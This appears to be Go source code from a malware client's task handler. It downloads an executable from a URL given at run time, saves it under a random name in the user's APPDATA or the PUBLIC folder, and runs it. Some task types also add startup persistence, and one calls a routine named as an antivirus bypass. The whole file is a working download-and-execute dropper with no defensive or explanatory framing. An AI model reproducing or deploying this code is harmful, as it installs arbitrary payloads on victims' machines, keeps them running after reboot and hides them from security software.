package main

import (
	"io"
	"net/http"
	"os"
	"utils"
)

func ExecTask(taskType int, url string) {
	appdata := os.Getenv("appdata") + "\\" + utils.RandomString(8, true) + ".exe"
	public := os.Getenv("public") + "\\" + utils.RandomString(8, true) + ".exe"
	switch taskType {
	case 1:
		DownloadFile(appdata, url)
		run("start " + appdata)
	case 2:
		DownloadFile(appdata, url)
		addStartup(appdata)
		run("start " + appdata)
	case 3:
		DownloadFile(public, url)
		run("start " + public)
	case 4:
		DownloadFile(public, url)
		addStartupAVBypass(public)
		run("start " + public)
	}
}

func DownloadFile(filepath string, url string) {
	resp, _ := http.Get(url)
	defer resp.Body.Close()
	out, _ := os.Create(filepath)
	defer out.Close()
	_, _ = io.Copy(out, resp.Body)
}
